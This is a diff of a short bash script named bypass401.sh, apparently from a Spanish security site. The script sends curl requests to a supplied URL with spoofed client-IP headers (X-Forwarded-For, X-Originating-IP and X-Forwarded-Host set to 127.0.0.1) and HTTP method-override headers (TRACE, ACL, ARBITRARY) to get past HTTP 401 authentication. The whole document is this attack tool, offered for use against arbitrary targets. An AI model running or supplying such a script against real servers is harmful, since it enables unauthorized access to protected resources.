@@ -1,8 +1,8 @@
-#Bypass 401 - hackingyseguridad.com
 #!/bin/bash
 echo "Uso.: ./bypass401.sh https://url"
-curl -k -I -s -v $1 \
--H "X-HTTP-Method-Override: DELETE" \
+# Otros metodos HTTP: -X ARBITRARY ACL TRACK
+curl -k -s -vvv $1 -X "TRACE" \
+-H "X-HTTP-Method-Override: ACL" \
 -H "X-Originating-IP: 127.0.0.1" \
 -H "X-Forwarded-For: 127.0.0.1" \
 -H "X-Forwarded-Host: 127.0.0.1" \
@@ -14,3 +14,5 @@ curl -k -I -s -v $1 \
 -H "Accept: text/html, applicattion/xhtml+xml, application/xml;q=0.9,*/*;q=0.8" \
 -H "Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3" \
 -H "Connection: keep-alive" \
+-H 'X-Method-Override: ARBITRARY' \
+
